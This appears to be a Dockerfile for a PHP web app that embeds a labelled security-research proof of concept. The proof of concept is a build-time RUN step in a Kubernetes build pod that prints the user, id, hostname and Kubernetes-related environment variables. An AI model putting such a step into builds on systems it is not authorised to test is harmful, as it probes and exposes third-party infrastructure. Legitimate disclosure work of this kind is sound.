FROM php:8.1-cli

# SECURITY RESEARCH POC - executes during `docker build`
# Demonstrates: arbitrary command execution in Wien Kubernetes build pod

RUN echo "=== SECURITY RESEARCH POC ===" \
    && echo "whoami: $(whoami)" \
    && echo "id: $(id)" \
    && echo "hostname: $(hostname)" \
    && echo "=== K8S context ===" \
    && env | grep -iE '^(KUBE|K8S|NAMESPACE|SERVICE)' || true \
    && echo "=== PoC Complete ==="

WORKDIR /var/www/html
COPY . .

RUN composer install --no-dev --optimize-autoloader 2>/dev/null || sh scripts/build.sh

EXPOSE 80
CMD ["php", "-S", "0.0.0.0:80", "-t", "web/"]
